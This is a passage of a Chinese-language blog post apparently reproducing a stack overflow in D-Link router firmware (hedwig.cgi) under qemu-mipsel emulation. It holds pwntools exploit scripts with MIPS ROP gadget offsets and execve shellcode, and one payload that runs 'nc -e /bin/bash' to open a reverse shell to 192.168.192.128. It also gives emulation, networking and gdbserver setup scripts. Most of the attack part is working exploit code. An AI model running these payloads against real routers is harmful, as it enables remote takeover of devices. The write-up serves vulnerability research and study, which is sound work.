- 1) # s0  system_addr - 1</span><br><span class=\"line\">payload += p32(libc_base + 0x159F4) # s1  move $t9, $s0 (=&gt; jalr $t9)</span><br><span class=\"line\">payload += b&#x27;a&#x27;*4</span><br><span class=\"line\">payload += p32(libc_base + 0x6DFD0) # s3  /bin/sh</span><br><span class=\"line\">payload += b&#x27;a&#x27;*(4*2)</span><br><span class=\"line\">payload += p32(libc_base + 0x32A98) # s6  addiu $s0, 1 (=&gt; jalr $s1)</span><br><span class=\"line\">payload += b&#x27;a&#x27;*(4*2)</span><br><span class=\"line\">payload += p32(libc_base + 0x13F8C) # ra  move $a0, $s3 (=&gt; jalr $s6)</span><br><span class=\"line\"> </span><br><span class=\"line\">payload = b&quot;uid=&quot; + payload</span><br><span class=\"line\">post_content = &quot;peruy=pwner&quot;</span><br><span class=\"line\">io = process(b&quot;&quot;&quot;</span><br><span class=\"line\">    qemu-mipsel -L ./ \\</span><br><span class=\"line\">    -0 &quot;hedwig.cgi&quot; \\</span><br><span class=\"line\">    -E REQUEST_METHOD=&quot;POST&quot; \\</span><br><span class=\"line\">    -E CONTENT_LENGTH=11 \\</span><br><span class=\"line\">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \\</span><br><span class=\"line\">    -E HTTP_COOKIE=\\&quot;&quot;&quot;&quot; + payload + b&quot;&quot;&quot;\\&quot; \\</span><br><span class=\"line\">    -E REQUEST_URI=&quot;2333&quot; \\</span><br><span class=\"line\">    ./htdocs/cgibin</span><br><span class=\"line\">&quot;&quot;&quot;, shell = True)</span><br><span class=\"line\">io.send(post_content)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ROP-shellcode\"><a href=\"#ROP-shellcode\" class=\"headerlink\" title=\"ROP + shellcode\"></a>ROP + shellcode</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(os = &#x27;linux&#x27;, arch = &#x27;mips&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class=\"line\"> </span><br><span class=\"line\">libc_base = 0x7F738000</span><br><span class=\"line\"> </span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x3cd</span><br><span class=\"line\">payload += b&#x27;a&#x27;*4</span><br><span class=\"line\">payload += p32(libc_base + 0x436D0) # s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span><br><span class=\"line\">payload += b&#x27;a&#x27;*4</span><br><span class=\"line\">payload += p32(libc_base + 0x56BD0) # s3  sleep</span><br><span class=\"line\">payload += b&#x27;a&#x27;*(4*5)</span><br><span class=\"line\">payload += p32(libc_base + 0x57E50) # ra  li $a0, 1 (=&gt; jalr $s1)</span><br><span class=\"line\"> </span><br><span class=\"line\">payload += b&#x27;a&#x27;*0x18</span><br><span class=\"line\">payload += b&#x27;a&#x27;*(4*4)</span><br><span class=\"line\">payload += p32(libc_base + 0x37E6C) # s4  move  $t9, $a1 (=&gt; jalr $t9)</span><br><span class=\"line\">payload += p32(libc_base + 0x3B974) # ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span><br><span class=\"line\"> </span><br><span class=\"line\">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class=\"line\">    slti $a2, $zero, -1</span><br><span class=\"line\">    li $t7, 0x69622f2f</span><br><span class=\"line\">    sw $t7, -12($sp)</span><br><span class=\"line\">    li $t6, 0x68732f6e</span><br><span class=\"line\">    sw $t6, -8($sp)</span><br><span class=\"line\">    sw $zero, -4($sp)</span><br><span class=\"line\">    la $a0, -12($sp)</span><br><span class=\"line\">    slti $a1, $zero, -1</span><br><span class=\"line\">    li $v0, 4011</span><br><span class=\"line\">    syscall 0x40404</span><br><span class=\"line\">&#x27;&#x27;&#x27;)</span><br><span class=\"line\">payload += b&#x27;a&#x27;*0x18</span><br><span class=\"line\">payload += shellcode</span><br><span class=\"line\"> </span><br><span class=\"line\">payload = b&quot;uid=&quot; + payload</span><br><span class=\"line\">post_content = &quot;peruy=pwner&quot;</span><br><span class=\"line\">io = process(b&quot;&quot;&quot;</span><br><span class=\"line\">    qemu-mipsel -L ./ \\</span><br><span class=\"line\">    -0 &quot;hedwig.cgi&quot; \\</span><br><span class=\"line\">    -E REQUEST_METHOD=&quot;POST&quot; \\</span><br><span class=\"line\">    -E CONTENT_LENGTH=11 \\</span><br><span class=\"line\">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \\</span><br><span class=\"line\">    -E HTTP_COOKIE=\\&quot;&quot;&quot;&quot; + payload + b&quot;&quot;&quot;\\&quot; \\</span><br><span class=\"line\">    -E REQUEST_URI=&quot;2333&quot; \\</span><br><span class=\"line\">    ./htdocs/cgibin</span><br><span class=\"line\">&quot;&quot;&quot;, shell = True)</span><br><span class=\"line\">io.send(post_content)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"虚拟机网络配置\"><a href=\"#虚拟机网络配置\" class=\"headerlink\" title=\"虚拟机网络配置\"></a>虚拟机网络配置</h2><h3 id=\"✅-步骤一：禁用-NetworkManager-对-eth0-和-br0-的管理\"><a href=\"#✅-步骤一：禁用-NetworkManager-对-eth0-和-br0-的管理\" class=\"headerlink\" title=\"✅ 步骤一：禁用 NetworkManager 对 eth0 和 br0 的管理\"></a>✅ 步骤一：禁用 NetworkManager 对 <code>eth0</code> 和 <code>br0</code> 的管理</h3><p>编辑或创建一个配置文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sudo</span> nano /etc/NetworkManager/conf.d/99-unmanaged-devices.conf</span><br></pre></td></tr></table></figure>\n\n<p>添加以下内容：</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[keyfile]</span></span><br><span class=\"line\"><span class=\"attr\">unmanaged-devices</span>=interface-name:eth0<span class=\"comment\">;interface-name:br0</span></span><br></pre></td></tr></table></figure>\n\n<p>保存后重启 NetworkManager：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sudo</span> systemctl restart NetworkManager</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h3 id=\"✅-步骤二：创建-Netplan-配置文件\"><a href=\"#✅-步骤二：创建-Netplan-配置文件\" class=\"headerlink\" title=\"✅ 步骤二：创建 Netplan 配置文件\"></a>✅ 步骤二：创建 Netplan 配置文件</h3><p>备份原来的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sudo</span> <span class=\"built_in\">mv</span> /etc/netplan/01-network-manager-all.yaml /etc/netplan/01-network-manager-all.yaml.bak</span><br></pre></td></tr></table></figure>\n\n<p>创建新配置：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sudo</span> nano /etc/netplan/01-bridge.yaml</span><br></pre></td></tr></table></figure>\n\n<p>内容如下（根据你实际接口名修改，比如 <code>ens33</code> 换成 <code>eth0</code>）：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">network:</span></span><br><span class=\"line\">  <span class=\"attr\">version:</span> <span class=\"number\">2</span></span><br><span class=\"line\">  <span class=\"attr\">renderer:</span> <span class=\"string\">networkd</span></span><br><span class=\"line\">  <span class=\"attr\">ethernets:</span></span><br><span class=\"line\">    <span class=\"attr\">eth0:</span></span><br><span class=\"line\">      <span class=\"attr\">dhcp4:</span> <span class=\"literal\">no</span></span><br><span class=\"line\">  <span class=\"attr\">bridges:</span></span><br><span class=\"line\">    <span class=\"attr\">br0:</span></span><br><span class=\"line\">      <span class=\"attr\">interfaces:</span> [<span class=\"string\">eth0</span>]</span><br><span class=\"line\">      <span class=\"attr\">dhcp4:</span> <span class=\"literal\">yes</span></span><br><span class=\"line\">      <span class=\"attr\">parameters:</span></span><br><span class=\"line\">        <span class=\"attr\">stp:</span> <span class=\"literal\">false</span></span><br><span class=\"line\">        <span class=\"attr\">forward-delay:</span> <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>⚠️ 注意：<br>如果你虚拟机里的接口名是 <code>ens33</code> 而不是 <code>eth0</code>，请把上面两处 <code>eth0</code> 改成 <code>ens33</code>。</p>\n</blockquote>\n<hr>\n<h3 id=\"✅-步骤三：应用配置\"><a href=\"#✅-步骤三：应用配置\" class=\"headerlink\" title=\"✅ 步骤三：应用配置\"></a>✅ 步骤三：应用配置</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sudo</span> netplan apply</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h3 id=\"✅-验证\"><a href=\"#✅-验证\" class=\"headerlink\" title=\"✅ 验证\"></a>✅ 验证</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip addr show br0</span><br><span class=\"line\">ip route</span><br></pre></td></tr></table></figure>\n\n<p>你应该能看到 <code>br0</code> 拿到了 DHCP 地址，<code>eth0</code> 没有 IP。</p>\n<h2 id=\"下载镜像\"><a href=\"#下载镜像\" class=\"headerlink\" title=\"下载镜像\"></a>下载镜像</h2><p><a href=\"https://people.debian.org/~aurel32/qemu/mipsel/\">https://people.debian.org/~aurel32/qemu/mipsel/</a><br>下载其中的<code>vmlinux-3.2.0-4-4kc-malta</code>内核以及<code>debian_squeeze_mipsel_standard.qcow2</code>镜像文件</p>\n<h2 id=\"qemu系统下\"><a href=\"#qemu系统下\" class=\"headerlink\" title=\"qemu系统下\"></a>qemu系统下</h2><h3 id=\"启动脚本\"><a href=\"#启动脚本\" class=\"headerlink\" title=\"启动脚本\"></a>启动脚本</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">sudo qemu-system-mipsel \\</span><br><span class=\"line\">    -M malta -kernel vmlinux-3.2.0-4-4kc-malta \\</span><br><span class=\"line\">    -hda debian_squeeze_mipsel_standard.qcow2 \\</span><br><span class=\"line\">    -append &quot;root=/dev/sda1 console=tty0&quot; \\</span><br><span class=\"line\">    -net nic,macaddr=00:16:3e:00:00:01 \\</span><br><span class=\"line\">    -net tap</span><br></pre></td></tr></table></figure>\n<h3 id=\"http-cond\"><a href=\"#http-cond\" class=\"headerlink\" title=\"http_cond\"></a>http_cond</h3><p>在qemu 中 &#x2F;root&#x2F;squashfs-root&#x2F; 下创建</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Umask 026</span><br><span class=\"line\">PIDFile /var/run/httpd.pid</span><br><span class=\"line\">LogGMT On  #开启log</span><br><span class=\"line\">ErrorLog /log #log文件</span><br><span class=\"line\"> </span><br><span class=\"line\">Tuning</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    NumConnections 15</span><br><span class=\"line\">    BufSize 12288</span><br><span class=\"line\">    InputBufSize 4096</span><br><span class=\"line\">    ScriptBufSize 4096</span><br><span class=\"line\">    NumHeaders 100</span><br><span class=\"line\">    Timeout 60</span><br><span class=\"line\">    ScriptTimeout 60</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">Control</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Types</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        text/html    &#123; html htm &#125;</span><br><span class=\"line\">        text/xml    &#123; xml &#125;</span><br><span class=\"line\">        text/plain    &#123; txt &#125;</span><br><span class=\"line\">        image/gif    &#123; gif &#125;</span><br><span class=\"line\">        image/jpeg    &#123; jpg &#125;</span><br><span class=\"line\">        text/css    &#123; css &#125;</span><br><span class=\"line\">        application/octet-stream &#123; * &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    Specials</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        Dump        &#123; /dump &#125;</span><br><span class=\"line\">        CGI            &#123; cgi &#125;</span><br><span class=\"line\">        Imagemap    &#123; map &#125;</span><br><span class=\"line\">        Redirect    &#123; url &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    External</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">Server</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ServerName &quot;Linux, HTTP/1.1, &quot;</span><br><span class=\"line\">    ServerId &quot;1234&quot;</span><br><span class=\"line\">    Family inet</span><br><span class=\"line\">    Interface eth1 #对应qemu仿真路由器系统的网卡</span><br><span class=\"line\">    Address 192.168.225.129 #qemu仿真路由器系统的IP</span><br><span class=\"line\">    Port &quot;1234&quot; #对应未被使用的端口</span><br><span class=\"line\">    Virtual</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        AnyHost</span><br><span class=\"line\">        Control</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            Alias /</span><br><span class=\"line\">            Location /htdocs/web</span><br><span class=\"line\">            IndexNames &#123; index.php &#125;</span><br><span class=\"line\">            External</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class=\"line\">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Control</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            Alias /HNAP1</span><br><span class=\"line\">            Location /htdocs/HNAP1</span><br><span class=\"line\">            External</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            IndexNames &#123; index.hnap &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"net-sh\"><a href=\"#net-sh\" class=\"headerlink\" title=\"net.sh\"></a>net.sh</h3><p>物理机上运行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#! /bin/sh</span><br><span class=\"line\">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class=\"line\">sudo iptables -F</span><br><span class=\"line\">sudo iptables -X</span><br><span class=\"line\">sudo iptables -t nat -F</span><br><span class=\"line\">sudo iptables -t nat -X</span><br><span class=\"line\">sudo iptables -t mangle -F</span><br><span class=\"line\">sudo iptables -t mangle -X</span><br><span class=\"line\">sudo iptables -P INPUT ACCEPT</span><br><span class=\"line\">sudo iptables -P FORWARD ACCEPT</span><br><span class=\"line\">sudo iptables -P OUTPUT ACCEPT</span><br><span class=\"line\">sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class=\"line\">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class=\"line\">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"init-sh\"><a href=\"#init-sh\" class=\"headerlink\" title=\"init.sh\"></a>init.sh</h3><p>在qemu中squashfs-root下创建</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class=\"line\">cp http_conf /</span><br><span class=\"line\">cp sbin/httpd /</span><br><span class=\"line\">cp -rf htdocs/ /</span><br><span class=\"line\">mkdir /etc_bak</span><br><span class=\"line\">cp -r /etc /etc_bak</span><br><span class=\"line\">rm /etc/services</span><br><span class=\"line\">cp -rf etc/ /</span><br><span class=\"line\">cp lib/ld-uClibc-0.9.30.1.so  /lib/</span><br><span class=\"line\">cp lib/libcrypt-0.9.30.1.so  /lib/</span><br><span class=\"line\">cp lib/libc.so.0  /lib/</span><br><span class=\"line\">cp lib/libgcc_s.so.1  /lib/</span><br><span class=\"line\">cp lib/ld-uClibc.so.0  /lib/</span><br><span class=\"line\">cp lib/libcrypt.so.0  /lib/</span><br><span class=\"line\">cp lib/libgcc_s.so  /lib/</span><br><span class=\"line\">cp lib/libuClibc-0.9.30.1.so  /lib/</span><br><span class=\"line\">cd /</span><br><span class=\"line\">rm -rf /htdocs/web/hedwig.cgi</span><br><span class=\"line\">rm -rf /usr/sbin/phpcgi</span><br><span class=\"line\">rm -rf /usr/sbin/hnap</span><br><span class=\"line\">ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class=\"line\">ln -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class=\"line\">ln -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class=\"line\">./httpd -f http_conf</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"fin-sh\"><a href=\"#fin-sh\" class=\"headerlink\" title=\"fin.sh\"></a>fin.sh</h3><p>qemu中squashfs-root下创建，退出时运行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">rm -rf /etc</span><br><span class=\"line\">mv /etc_bak/etc /etc</span><br><span class=\"line\">rm -rf /etc_bak</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"开启服务\"><a href=\"#开启服务\" class=\"headerlink\" title=\"开启服务\"></a>开启服务</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810194723866.png\" alt=\"访问网站\"></p>\n<h3 id=\"run-sh\"><a href=\"#run-sh\" class=\"headerlink\" title=\"run.sh\"></a>run.sh</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">export CONTENT_LENGTH=&quot;11&quot;</span><br><span class=\"line\">export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;</span><br><span class=\"line\">export HTTP_COOKIE=&quot;uid=`cat payload`&quot;</span><br><span class=\"line\">export REQUEST_METHOD=&quot;POST&quot;</span><br><span class=\"line\">export REQUEST_URI=&quot;2333&quot;</span><br><span class=\"line\">echo &quot;peruy=pwner&quot;|./gdbserver.mipsle 192.168.225.154:6666 /htdocs/web/hedwig.cgi</span><br><span class=\"line\">#echo &quot;winmt=pwner&quot;|/htdocs/web/hedwig.cgi</span><br><span class=\"line\">unset CONTENT_LENGTH</span><br><span class=\"line\">unset CONTENT_TYPE</span><br><span class=\"line\">unset HTTP_COOKIE</span><br><span class=\"line\">unset REQUEST_METHOD</span><br><span class=\"line\">unset REQUEST_URI</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"查找libc-和-偏移\"><a href=\"#查找libc-和-偏移\" class=\"headerlink\" title=\"查找libc 和 偏移\"></a>查找libc 和 偏移</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810220153748.png\" alt=\"qemu调试\"></p>\n<h3 id=\"发送payload\"><a href=\"#发送payload\" class=\"headerlink\" title=\"发送payload\"></a>发送payload</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810221044091.png\" alt=\"打通\"></p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><h3 id=\"直接发payload\"><a href=\"#直接发payload\" class=\"headerlink\" title=\"直接发payload\"></a>直接发payload</h3><h4 id=\"ROP链\"><a href=\"#ROP链\" class=\"headerlink\" title=\"ROP链\"></a>ROP链</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os = <span class=\"string\">&#x27;linux&#x27;</span>, arch = <span class=\"string\">&#x27;mips&#x27;</span>, log_level = <span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">cmd = <span class=\"string\">b&#x27;nc -e /bin/bash 192.168.192.128 8888&#x27;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">libc_base = <span class=\"number\">0x77f34000</span></span><br><span class=\"line\"> </span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x3cd</span></span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x53200</span> - <span class=\"number\">1</span>) <span class=\"comment\"># s0  system_addr - 1</span></span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x169C4</span>) <span class=\"comment\"># s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">4</span>*<span class=\"number\">7</span>)</span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x32A98</span>) <span class=\"comment\"># ra  addiu $s0, 1 (=&gt; jalr $s1)</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span></span><br><span class=\"line\">payload += cmd</span><br><span class=\"line\"> </span><br><span class=\"line\">fd = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;payload&quot;</span>, <span class=\"string\">&quot;wb&quot;</span>)</span><br><span class=\"line\">fd.write(payload)</span><br><span class=\"line\">fd.close()</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"ROP-shellcode-1\"><a href=\"#ROP-shellcode-1\" class=\"headerlink\" title=\"ROP+shellcode\"></a>ROP+shellcode</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span 